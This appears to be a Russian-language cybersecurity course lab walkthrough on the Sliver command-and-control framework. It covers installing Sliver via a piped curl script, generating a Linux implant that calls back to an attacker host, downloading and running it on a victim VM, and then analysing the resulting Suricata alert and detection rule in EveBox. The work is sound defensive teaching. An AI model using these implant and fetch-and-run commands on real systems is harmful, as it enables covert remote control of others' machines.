# Guided Case 2.23 — Sliver

> [!info] Путь в курсе
> Глава 2: Сети и сетевая безопасность / Часть 3. Кибератаки и защита от них / Фрэймворки постэксплуатации

## Стенд / введение

Создадим виртуальную инфраструктуру в соответствии с схемой ниже:

![](../../_images/4cf6128efbe7.webp)

Первая сеть **192.168.1.0/24**, которая состоит из:

1. маршрутизатор **MikroTik** с интерфейсом **ether1**:
   
   - IP-адрес - 192.168.1.1
   - Маска - 255.255.255.0
2. **Debian-машина** с **GUI** и интерфейсом **enp0s3**. Установка виртуальной машины аналогична разделу **установка Debian**, только при создании требуется загрузить графический интерфейс, поставить минимум 4ГБ оперативной памяти и минимум 20ГБ обычной памяти.
   
   - IP-адрес - 192.168.1.250
   - Маска - 255.255.255.0
   - Сетевой шлюз - 192.168.1.1

Вторая сеть **192.168.2.0/24** состоит из:

1. маршрутизатор **MikroTik** с интерфейсом **ether2**:
   
   - IP-адрес - 192.168.2.1
   - Маска - 255.255.255.0
2. **VictimX** с интерфейсом **enp0s3**. Установка виртуальной машины аналогична разделу [**установка Debian**](https://wiki.ptsecurity.com/spaces/PTCybergrad/pages/670549543/%D0%9D%D0%B0%D1%81%D1%82%D1%80%D0%BE%D0%B9%D0%BA%D0%B0+Debian+12).
   
   - IP-адрес - назначается по DHCP
   - Маска - назначается по DHCP
   - Сетевой шлюз - 192.168.2.1

Третья сеть **10.0.0.0/8** состоит из:

1. маршрутизатор **MikroTik** с интерфейсом **ether3**:
   
   - IP-адрес - 10.0.0.1
   - Маска - 255.0.0.0
2. **Suricata** с интерфейсом **enp0s3**:
   
   - IP-адрес - 10.255.255.254
   - Маска - 255.0.0.0
   - Сетевой шлюз - 10.0.0.1

> У виртуальных машин должно быть по 1 сетевому адаптеру VirtualBox в режиме **Internal Network**

На атакующей машине установим **Sliver** от root командой `curl https://sliver.sh/install | bash`. После установки в домашней директории пользователя должны появится файлы **sliver-client** и **sliver-server**, которые отвечают за работу фреймворка.

> **Sliver** - это кроссплатформенный фреймворк командного контроля, который используется для имитации кибератак, скрытного управления скомпрометированными системами и проведения постэксплуатации в IT-инфраструктуре.

![](../../_images/82c8069deff9.webp)

Запустим Sliver командой `./sliver-server`

![](../../_images/a1d1291706d7.webp)

> В данном кейсе используется Sliver **v1.7.3**

Нас ожидает интерактивное приглашение командной строки **[server] sliver >**. Сгенерируем полезную нагрузку командой `generate --http 192.168.1.250:80 --os linux --arch amd64`, где:

- **generate** - базовая команда Sliver для компиляции и сборки нового исполняемого файла **импланта**
- **--http 192.168.1.250:80** - флаг указывает протокол и адрес управляющего сервера для обратного подключения
- **--os linux** - флаг определяет целевую операционную систему, под которую собирается исполняемый файл
- **--arch amd64** - флаг указывает архитектуру процессора целевой системы

> Имплант - это нагрузка, используемая для поддержания доступа к компьютеру жертвы

![](../../_images/10303b56012f.webp)

После создания файла необходимо его перенести на машину-жертву, допустим с помощью python:

1. `python -m http.server 8000` - запускаем python сервер в директории с полезной нагрузкой, где:
   
   - **-m http.server** - указывает на запуск встроенной библиотеки http.server
   - **8000** - порт, на котором будет запущен сервер
2. `wget http://192.168.1.250:8000/REGISTERED_DIVIDE` - на машине-жертве выполняем загрузку файла
   
   - **wget** - утилита для скачивания файлов
   - **http://192.168.1.250:8000/shell.elf** - местоположение файла на поднятом сервере python

![](../../_images/e054c55483ad.webp)

После переноса бинарного файла сделаем его исполняемым с помощью команды `chmod +x ./REGISTERED_DIVIDE` и запустим его. Затем вернемся в Sliver и проверим список активных подключений командой `sessions`

![](../../_images/c47526b7b455.webp)

Подключимся к этой сессии с помощью команды **use 8afdf039**. Затем посмотрим, в какой директории мы находимся - `pwd`

![](../../_images/b2d02819f9a9.webp)

Посмотрим на логи в EveBox, которые появились в записях во время атаки.

![](../../_images/6ad9c83980e8.webp)

В EveBox сработало правило из открытого набора [**PT Rules**](https://rules.ptsecurity.com/view/ptopen-all.rules):

```
alert http any any -> any any (msg: "TOOLS [PTsecurity] Sliver C2 HTTP Key exchange (gzip)"; flow: established, to_server; http.method; content: "POST"; http.uri; pcre: "/\?(?:[a-z_]=[a-z0-9_]{7,14}&[a-z_]{2}=[a-z0-9_]{8,13}|[a-z_]{2}=[a-z0-9_]{8,13}&[a-z_]=[a-z0-9_]{7,14}|[a-z_]=[a-z0-9_]{7,14})$/U"; http.header.raw; content: !"Cookie|3a|"; nocase; content: "|0d 0a|Accept-Encoding|3A| gzip|0d 0a|"; nocase; http.content_len; byte_test: 0, >=, 133, 0, string, dec; byte_test: 0, <=, 295, 0, string, dec; pkt_data; content: "|0D 0A 0D 0A 1F 8B 08 00 00 00 00|"; reference: url, virustotal.com/gui/file/e877e29e45b823fe32c600508dd9e05e399272c98449976b66f44721e54e42e3/detection; reference: url, github.com/BishopFox/sliver; reference: url, rules.ptsecurity.com; classtype: attempted-admin; sid: 10008539; rev: 6;)

```

Правило, которое зафиксировало атаку, настроено на обнаружение сетевой активности фреймворка Sliver на этапе обмена ключами по протоколу HTTP. Обнаружение строится на строгой последовательности проверок структуры запроса и его заголовков. Затем, с помощью ключевого слова **pkt_data** происходит анализ по всему пакету комбинации байт **0D 0A 0D 0A 1F 8B 08 00 00 00 00**. Данная последовательность байт указывает на окончание HTTP-заголовков и начало тела запроса, сжатого методом **Gzip**. Если последовательность специфичного URI, структуры заголовков, ограничений по размеру и сигнатуры сжатых данных в теле совпала, Suricata генерирует предупреждение об атаке.

Откроем карточку инцидента и изучим его подробнее

![](../../_images/d09723b2a6b7.webp)

Видим следующую информацию:

- **Timestamp** - 2026-06-22 17:39:32.160
- **Protocol** - TCP
- **Source** - 192.168.2.249, порт отправки: 60592
- **Destination** - 192.168.1.250, порт назначения: 80
- **In Interface** - dummy0
- **Signature** - TOOLS [PTsecurity] Sliver C2 HTTP Key exchange (gzip)
- **Category** - попытка получения прав администратора
- **Severity** - 1, является наивысшим уровнем опасности
- **Action** - allowed, трафик был пропущен системой обнаружения вторжений, так как она работает в режиме мониторинга

Имплант отправил на управляющий сервер **4** пакета, передав **864** байта данных. В ответ от сервера пришло **2** пакета объемом **140** байт. Малое количество пакетов указывает на то, что это был одиночный сетевой запрос. HTTP-метод - **POST**, атакующий отправлял зашифрованные данные для обмена ключами в теле запроса, а не через адресную строку, запрос был отправлен на эндпоинт **/bundles/scripts/bundles/scripts/app.js?b=504214921772** для мимикрии под загрузку легитимного JavaScript. Инструментом атаки выступает имплант Sliver с **User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.8860.178 Safari/537.36**, выглядящий как браузер. В процессе сессии также зафиксирована имитация передачи файла с именем **/bundles/scripts/bundles/scripts/app.js** размером **294** байта.
